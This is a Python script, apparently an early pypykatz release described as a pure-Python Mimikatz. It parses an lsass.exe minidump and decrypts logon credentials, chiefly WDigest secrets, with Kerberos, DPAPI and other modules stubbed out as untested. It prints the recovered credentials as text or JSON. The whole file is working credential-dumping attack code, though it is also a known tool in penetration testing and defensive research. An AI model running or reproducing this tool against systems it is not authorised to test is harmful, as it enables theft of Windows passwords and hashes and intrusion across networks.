#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import io
import os
import re
import struct
import logging

from minidump.minidumpfile import MinidumpFile
from minidump.streams.SystemInfoStream import PROCESSOR_ARCHITECTURE

from pypykatz.commons.common import *
from pypykatz.lsadecryptor.lsa_decryptor import *
from pypykatz.lsadecryptor.lsa_templates import *
from pypykatz.lsadecryptor.packages.wdigest.wdigest_decryptor import *
from pypykatz.lsadecryptor.packages.wdigest.wdigest_templates import *
from pypykatz.lsadecryptor.packages.tspkg.tspkg_decryptor import *
from pypykatz.lsadecryptor.packages.tspkg.tspkg_templates import *
from pypykatz.lsadecryptor.packages.ssp.decryptor import *
from pypykatz.lsadecryptor.packages.ssp.templates import *
from pypykatz.lsadecryptor.packages.livessp.decryptor import *
from pypykatz.lsadecryptor.packages.livessp.templates import *
from pypykatz.lsadecryptor.packages.dpapi.decryptor import *
from pypykatz.lsadecryptor.packages.dpapi.templates import *
from pypykatz.lsadecryptor.packages.msv.msv_decryptor import * 
from pypykatz.lsadecryptor.packages.msv.msv_templates import * 
from pypykatz.lsadecryptor.packages.kerberos.kerberos_templates import * 
from pypykatz.lsadecryptor.packages.kerberos.kerberos_decryptor import * 


class pypykatz():
	"""mimikatz offline"""
	def __init__(self, minidump):
		self.minidump = minidump
		self.reader = minidump.get_reader().get_buffered_reader()
		self.credentials = []
		self.architecture = None
		self.operating_system = None
		self.buildnumber = None
		self.lsa_decryptor = None
		self.set_system_info()
		
		self.logon_sessions = None
		self.orphaned_creds = []
		
	def set_system_info(self):
		if self.minidump.sysinfo.ProcessorArchitecture == PROCESSOR_ARCHITECTURE.AMD64:
			self.architecture = 'x64'
		elif self.minidump.sysinfo.ProcessorArchitecture == PROCESSOR_ARCHITECTURE.INTEL:
			self.architecture = 'x86'
			
		self.operating_system = self.minidump.sysinfo.OperatingSystem
		self.buildnumber = self.minidump.sysinfo.BuildNumber
		
	def get_logoncreds(self):
		template = LOGON_SESSION_DECRYPTOR_TEMPLATE(self.buildnumber, self.architecture).get_template()
		logoncred_decryptor = LogonCredDecryptor(self.reader, template, self.lsa_decryptor)
		logoncred_decryptor.start()
		self.logon_sessions = logoncred_decryptor.logon_sessions
	
	def get_lsa(self):
		lsa_dec_template = LSADecryptorTemplateFactory(self.buildnumber, self.architecture).get_template()
		lsa_dec = LsaDecryptor(self.reader, lsa_dec_template)
		logging.debug(lsa_dec.dump())
		return lsa_dec
	
	def get_wdigest(self):
		wdigest_dec_template = WDIGEST_DECRYPTOR_TEMPLATE(self.architecture, self.buildnumber).get_template()
		wdigest_dec = WdigestDecryptor(self.reader,wdigest_dec_template, self.lsa_decryptor)
		wdigest_dec.start()
		for cred in wdigest_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].wdigest_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	def get_tspkg(self):
		tspkg_dec_template = TSPKG_DECRYPTOR_TEMPLATE(self.architecture, self.buildnumber).get_template()
		tspkg_dec = TspkgDecryptor(self.reader,tspkg_dec_template, self.lsa_decryptor)
		tspkg_dec.start()
		for cred in tspkg_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].tspkg_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_ssp(self):
		ssp_dec_template = SSP_DECRYPTOR_TEMPLATE(self.architecture, self.buildnumber).get_template()
		ssp_dec = SspDecryptor(self.reader, ssp_dec_template, self.lsa_decryptor)
		ssp_dec.start()
		for cred in ssp_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].ssp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_livessp(self):
		livessp_dec_template = LIVESSP_DECRYPTOR_TEMPLATE(self.architecture, self.buildnumber).get_template()
		livessp_dec = LiveSspDecryptor(self.reader, livessp_dec_template, self.lsa_decryptor)
		livessp_dec.start()
		for cred in livessp_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].livessp_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
				
	def get_dpapi(self):
		dpapi_dec_template = DPAPI_DECRYPTOR_TEMPLATE(self.architecture, self.buildnumber).get_template()
		dpapi_dec = DpapiDecryptor(self.reader, dpapi_dec_template, self.lsa_decryptor)
		dpapi_dec.start()
		for cred in dpapi_dec.credentials:
			if cred.luid in self.logon_sessions:
				self.logon_sessions[cred.luid].dpapi_creds.append(cred)
			else:
				self.orphaned_creds.append(cred)
	
	def get_kerberos(self):
		kerberos_dec_template = KERBEROS_DECRYPTOR_TEMPLATE(self.architecture, self.buildnumber).get_template()
		kerberos_dec = KerberosDecryptor(self.reader,kerberos_dec_template, self.lsa_decryptor)
		kerberos_dec.start()			
	
	def start(self):
		self.lsa_decryptor = self.get_lsa()
		self.get_logoncreds()
		self.get_wdigest()
		#CHICKEN BITS - UNTESTED!!! DO NOT UNCOMMENT
		#self.get_kerberos()
		#self.get_tspkg()
		#self.get_ssp()
		#self.get_livessp()
		#self.get_dpapi()
		

if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Pure Python implementation of Mimikatz -currently only minidump-')
	parser.add_argument('minidumpfile', help='path to the minidump file of lsass.exe')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
	
	args = parser.parse_args()
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)
	
	mf = MinidumpFile.parse(args.minidumpfile)
	mimi = pypykatz(mf)
	mimi.start()
	
	if args.json:
		for luid in mimi.logon_sessions:
			print(mimi.logon_sessions[luid].to_json())
	else:
		for luid in mimi.logon_sessions:
			print(str(mimi.logon_sessions[luid]))
			
		print('== Orphaned credentials ==')
		for cred in mimi.orphaned_creds:
			print(str(cred))